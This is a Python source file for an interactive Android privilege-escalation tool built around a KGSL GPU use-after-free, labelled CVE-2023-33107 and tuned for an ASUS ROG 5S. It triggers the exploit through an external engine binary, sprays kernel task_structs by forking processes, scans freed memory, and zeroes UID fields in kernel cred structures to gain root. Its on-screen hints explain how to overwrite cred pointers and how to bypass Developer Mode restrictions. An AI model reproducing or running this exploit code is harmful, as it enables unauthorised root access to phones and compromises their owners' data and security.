import os
import sys
import time
import struct
import subprocess
import platform

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.exploit_proc = None
        # Dynamic path detection for Termux/Linux portability
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")
        
        # Fallback for common Termux paths if not found in script dir
        if not os.path.exists(self.engine_path):
            termux_path = "/data/data/com.termux/files/home/androidCVE/androidCVE/memory_explorer/kgsl_engine"
            if os.path.exists(termux_path):
                self.engine_path = termux_path
            else:
                # Try to find it in parent or current dir
                for p in ["./kgsl_engine", "../kgsl_engine", "/workspace/androidCVE/memory_explorer/kgsl_engine"]:
                    if os.path.exists(p):
                        self.engine_path = os.path.abspath(p)
                        break

        self.uaf_start = 0x7001ff000
        self.uaf_size = 0x10000000
        
        # AI Knowledge Base
        self.system_apps = {
            "com.android.settings": "Settings / Developer Mode",
            "com.android.systemui": "System UI / Status Bar",
            "com.android.deskclock": "Clock / Alarm App",
            "com.android.calculator2": "Calculator App",
            "com.android.contacts": "Contacts / Phonebook",
            "com.android.gallery3d": "Gallery / Camera",
            "com.android.vending": "Google Play Store",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher",
            "system_server": "Kernel System Server (Core)",
            "surfaceflinger": "Display Compositor",
        }
        
        self.kernel_structures = {
            b"KETO0422": "task_struct (Exploit Marker)",
            b"\x63\x6F\x6D\x2E\x61\x6E\x64\x72\x6F\x69\x64": "Android Package Name",
            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue",
            b"init_cred": "Root Credentials Structure",
            b"\x7fELF": "Kernel ELF Header (Base)",
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00": "potential cred struct"
        }

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                available = int(lines[2].split()[1])
                return 100.0 * (1 - (available / total))
        except:
            return 0.0

    def read_page(self, va):
        try:
            cmd = [self.engine_path, "read", hex(va)]
            data = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
            return data
        except:
            return None

    def analyze_binary(self, data):
        """
        Analyze code patterns (pseudo-disassembler)
        """
        results = []
        # Look for AArch64 function prologues (stp x29, x30, [sp, #-...]!)
        if len(data) >= 4 and data[0:2] == b"\xfd\x7b" and (data[2] & 0x80):
            results.append("Detected: AArch64 Function Prologue (Stack Frame Setup)")
        
        # Look for ADRP / ADD pairs (accessing globals)
        for i in range(0, min(len(data), 128) - 8, 4):
            val = struct.unpack("<I", data[i:i+4])[0]
            if (val & 0x9F000000) == 0x90000000: # ADRP
                results.append(f"Detected: ADRP instruction at +0x{i:x} (Accessing Global Data)")
        
        return results

    def classify_page(self, page_data, va):
        classification = {
            "type": "Unknown",
            "description": "Raw Data",
            "va": hex(va),
            "confidence": 0.0,
            "data": page_data
        }

        # Check for Process Markers (System/User Apps)
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                classification["type"] = "System App"
                classification["description"] = name
                classification["confidence"] = 1.0
                return classification

        # Check for Kernel Structures
        for marker, name in self.kernel_structures.items():
            if marker in page_data:
                classification["type"] = "Kernel Core"
                classification["description"] = name
                classification["confidence"] = 0.9
                return classification

        # Check for UID patterns (e.g., system UID 1000)
        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if uid_pattern in page_data:
            classification["type"] = "System Service"
            classification["description"] = "System Process (UID 1000)"
            classification["confidence"] = 0.8
            return classification

        return classification

    def render_tui(self):
        os.system('clear')
        ram = self.get_ram_usage()
        print("="*75)
        print(" KGSL MEMORY EXPLORER & AI CLASSIFIER (ROG 5S Optimized)")
        print(f" Status: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | Sprays: {len(self.spray_procs)} | RAM: {ram:.1f}%")
        print("="*75)
        
        # Memory Map Visualization
        print("UAF MEMORY MAP:")
        map_size = 50
        progress = 0
        if self.found_items:
            # Simple visualization of where items are found in the 256MB range
            for i in range(map_size):
                chunk_start = self.uaf_start + (i * (self.uaf_size // map_size))
                chunk_end = chunk_start + (self.uaf_size // map_size)
                found = any(chunk_start <= int(item['va'], 16) < chunk_end for item in self.found_items)
                print("█" if found else "░", end="")
        else:
            print("░" * map_size)
        print("\n" + "-" * 75)
        
        print(f"{'ID':<3} | {'TYPE':<15} | {'DESCRIPTION':<35} | {'VA ADDRESS':<12}")
        print("-" * 75)
        
        for i, item in enumerate(self.found_items):
            print(f"{i:<3} | {item['type']:<15} | {item['description']:<35} | {item['va']:<12}")
        
        print("\n" + "="*75)
        print("[E] Trigger Exploit  [S] Start Scan  [P] Spray  [C] Clear Sprays")
        print("[R] Check Root       [B] Rebuild     [Q] Quit   [ID] View Details")
        
    def trigger_exploit(self):
        if self.exploit_proc:
            print("[!] Exploit already active.")
            return
        print("[*] Triggering KGSL UAF (CVE-2023-33107)...")
        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
        # Wait for ready signal
        for line in self.exploit_proc.stdout:
            if "UAF_READY" in line:
                print("[+] UAF Triggered successfully.")
                break
        time.sleep(1)

    def clear_sprays(self):
        print(f"[*] Terminating {len(self.spray_procs)} spray processes...")
        for pid in self.spray_procs:
            try: os.kill(pid, 9)
            except: pass
        self.spray_procs = []
        print("[+] RAM should be recovering now.")
        time.sleep(1)

    def run_spray(self, count=2000):
        current_ram = self.get_ram_usage()
        if current_ram > 50.0:
            print(f"[!] RAM usage ({current_ram:.1f}%) exceeds safety limit (50%).")
            print("[*] Please clear existing sprays first [C].")
            time.sleep(2)
            return
            
        print(f"[*] Spraying {count} task_structs...")
        import ctypes
        import ctypes.util
        
        libc_path = ctypes.util.find_library('c')
        if not libc_path: libc_path = 'libc.so'
        try:
            libc = ctypes.CDLL(libc_path)
        except:
            print("[-] Could not load libc for prctl. Spray names might be default.")
            libc = None
            
        PR_SET_NAME = 15
        
        for i in range(count):
            pid = os.fork()
            if pid == 0:
                # In child
                if libc:
                    name = f"KETO{i:04d}".encode()
                    libc.prctl(PR_SET_NAME, name, 0, 0, 0)
                while True: time.sleep(100)
            else:
                self.spray_procs.append(pid)
        print(f"[+] Sprayed {len(self.spray_procs)} processes.")
        time.sleep(1)

    def check_root(self):
        print("\n[*] Checking for Root status...")
        try:
            # Method 1: id command
            res = subprocess.check_output(["id"], text=True).strip()
            print(f">> [id]: {res}")
            
            # Method 2: Check for protected file access
            try:
                with open("/data/system/packages.list", "r") as f:
                    f.read(1)
                print(">> [Access]: SUCCESS! Can read protected system files.")
            except:
                print(">> [Access]: FAILED. Cannot read protected files (SELinux or UID mismatch).")
                
            # Method 3: getenforce
            try:
                res = subprocess.check_output(["getenforce"], text=True).strip()
                print(f">> [SELinux]: {res}")
            except:
                pass
        except Exception as e:
            print(f"[-] Error checking root: {e}")
        input("\nPress Enter...")

    def write_page(self, va, data):
        try:
            cmd = [self.engine_path, "write", hex(va)]
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
            proc.communicate(input=data)
            return proc.returncode == 0
        except:
            return False

    def patch_to_root(self, va):
        print(f"[*] Analyzing structure for patching at {hex(va)}...")
        page_data = self.read_page(va)
        if not page_data:
            print("[-] Failed to read page for patching.")
            return

        # Simple logic: search for our UID and zero it
        my_uid = os.getuid()
        uid_bytes = struct.pack("<I", my_uid)
        
        new_data = bytearray(page_data)
        found = False
        # Cred structures usually have 8 consecutive UIDs (uid, gid, suid, sgid, euid, egid, fsuid, fsgid)
        for i in range(0, len(page_data) - 32, 4):
            if page_data[i:i+4] == uid_bytes:
                print(f"[+] Found UID {my_uid} at offset +0x{i:x}. Zeroing...")
                for j in range(8): # Zero all 8 fields
                    new_data[i+j*4 : i+j*4+4] = b"\x00\x00\x00\x00"
                found = True
                break
        
        if found:
            if self.write_page(va, bytes(new_data)):
                print("[+++] Memory patch applied successfully!")
            else:
                print("[-] Failed to write patched data.")
        else:
            print("[-] Could not find UID pattern in this page.")

    def show_detail(self, item_idx):
        if item_idx >= len(self.found_items):
            return
        
        item = self.found_items[item_idx]
        data = item['data']
        
        os.system('clear')
        print(f"--- DETAIL VIEW: {item['description']} ---")
        print(f"Virtual Address: {item['va']}")
        print(f"Confidence: {item['confidence']*100}%")
        print("-" * 60)
        
        # Binary Representation (BIOS style)
        print("BINARY DATA (First 16 bytes):")
        for i in range(0, min(len(data), 16), 4):
            val = struct.unpack("<I", data[i:i+4])[0]
            print(f"0x{val:08X}: {bin(val)[2:].zfill(32)}")
        
        print("\nAI CODE ANALYSIS:")
        analysis = self.analyze_binary(data)
        if not analysis:
            print(">> No executable code patterns detected (likely Data region).")
        for line in analysis[:5]:
            print(f">> {line}")
        
        print("\nHEX DUMP (BIOS style):")
        for i in range(0, min(len(data), 128), 16):
            chunk = data[i:i+16]
            hex_str = " ".join(f"{b:02X}" for b in chunk)
            ascii_str = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            print(f"{i:04X}: {hex_str:<48} | {ascii_str}")
        
        print("\nAI TRANSLATION & LOGIC:")
        if "Settings" in item['description']:
            print(">> [Logic]: System Settings process detected. Contains runtime configuration.")
            print(">> [Advice]: Useful for bypassing 'Developer Mode' or 'USB Debugging' restrictions.")
        elif "UID 1000" in item['description'] or "System UID" in item['description']:
            print(">> [Logic]: Critical System Privilege structure.")
            print(">> [Action]: Zeroing the UID fields here will grant UID 0 (Root) to this process.")
        elif "task_struct" in item['description']:
            # Verified offsets for ROG 5S
            pid_off = 0x548
            comm_off = 0x718
            cred_off = 0x770
            
            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
            cred_ptr = struct.unpack("<Q", data[cred_off:cred_off+8])[0] if len(data) > cred_off+8 else 0
            
            print(f">> [Logic]: Task structure for PID {pid}.")
            print(f">> [Pointer]: Found 'cred' at task+0x770: {hex(cred_ptr)}")
            print(">> [Action]: Overwrite this pointer to init_cred or patch the target struct.")
        elif "cred struct" in item['description']:
            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
            print(f">> [Logic]: Credentials structure. Current UID: {uid}")
            print(">> [Action]: Patch fields +4 (UID), +8 (GID), +12 (EUID) to 0 for root.")
        
        print("-" * 60)
        print("[P] Patch to Root (UID 0)   [N] Scan Neighbors   [Enter] Back")
        
        choice = input("> ").lower()
        if choice == 'n':
            print("[*] Scanning adjacent pages...")
            base_va = int(item['va'], 16)
            for offset in [-0x1000, 0x1000]:
                neighbor_va = base_va + offset
                neighbor_data = self.read_page(neighbor_va)
                if neighbor_data:
                    res = self.classify_page(neighbor_data, neighbor_va)
                    res['description'] = f"Neighbor of ID {item_idx}"
                    self.found_items.append(res)
            print("[+] Neighbors added to the list.")
            time.sleep(1)
        elif choice == 'p':
            print("[!] Security Warning: Are you sure you want to patch this kernel structure? (y/n)")
            if input("> ").lower() == 'y':
                self.patch_to_root(int(item['va'], 16))
                input("Press Enter...")

    def try_compile_engine(self):
        source_path = self.engine_path + ".c"
        if os.path.exists(source_path):
            print(f"[*] Attempting to compile engine for your architecture ({platform.machine()})...")
            try:
                # Try both gcc and clang (common in Termux)
                for compiler in ["gcc", "clang"]:
                    try:
                        subprocess.check_call([compiler, "-O2", source_path, "-o", self.engine_path, "-lpthread"])
                        print(f"[+] Compilation successful using {compiler}!")
                        return True
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        continue
            except Exception as e:
                print(f"[-] Compilation failed: {e}")
        return False

    def run(self):
        if not os.path.exists(self.engine_path):
            if not self.try_compile_engine():
                print(f"[!] ERROR: Engine not found at {self.engine_path}")
                print("[*] Please run: gcc -O2 kgsl_engine.c -o kgsl_engine -lpthread")
                return
        
        self.render_tui()
        while True:
            try:
                cmd = input("> ").lower()
            except EOFError:
                break
                
            if cmd == 'q':
                # Cleanup
                if self.exploit_proc: self.exploit_proc.terminate()
                for pid in self.spray_procs: 
                    try: os.kill(pid, 9)
                    except: pass
                break
            elif cmd == 'e':
                self.trigger_exploit()
                self.render_tui()
            elif cmd == 'p':
                self.run_spray()
                self.render_tui()
            elif cmd == 'c':
                self.clear_sprays()
                self.render_tui()
            elif cmd == 'b':
                self.try_compile_engine()
                input("Press Enter...")
                self.render_tui()
            elif cmd == 's':
                if not self.exploit_proc:
                    print("[!] Trigger exploit [E] first!")
                    time.sleep(1)
                    self.render_tui()
                    continue
                print("[*] Starting GPU Scan (Slow Spray mode)...")
                # Increased range to 256MB
                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x10000000)]
                try:
                    proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                except OSError as e:
                    if e.errno == 8: # Exec format error
                        print("[!] Exec format error detected. Binary is likely for wrong architecture.")
                        if self.try_compile_engine():
                            print("[*] Retrying scan with newly compiled engine...")
                            proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                        else:
                            print("[-] Auto-compilation failed. Please compile kgsl_engine.c manually on this device.")
                            continue
                    else:
                        print(f"[-] Failed to start engine: {e}")
                        continue
                
                try:
                    for line in proc.stdout:
                        # Real-time RAM monitoring during scan
                        ram = self.get_ram_usage()
                        if ram > 70.0: # STRICT TOTAL LIMIT 70%
                            print(f"\n[!] CRITICAL SYSTEM LOAD ({ram:.1f}%). Throttling...")
                            time.sleep(3)
                            
                        if "MATCH_" in line:
                            va = int(line.split(":")[1], 16)
                            page_data = self.read_page(va)
                            if page_data:
                                res = self.classify_page(page_data, va)
                                # If it's a KETO match but not classified, mark it specially
                                if "MATCH_KETO" in line and res['type'] == "Unknown":
                                    res['type'] = "Task Marker"
                                    res['description'] = "KETO Signal Found"
                                    res['confidence'] = 0.95
                                
                                self.found_items.append(res)
                                self.render_tui()
                                print(f"[*] Found candidate at {hex(va)}")
                except KeyboardInterrupt:
                    proc.terminate()
                
                print("[+] Scan complete.")
            elif cmd == 'r':
                self.check_root()
                self.render_tui()
            elif cmd.isdigit():
                self.show_detail(int(cmd))
                self.render_tui()

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
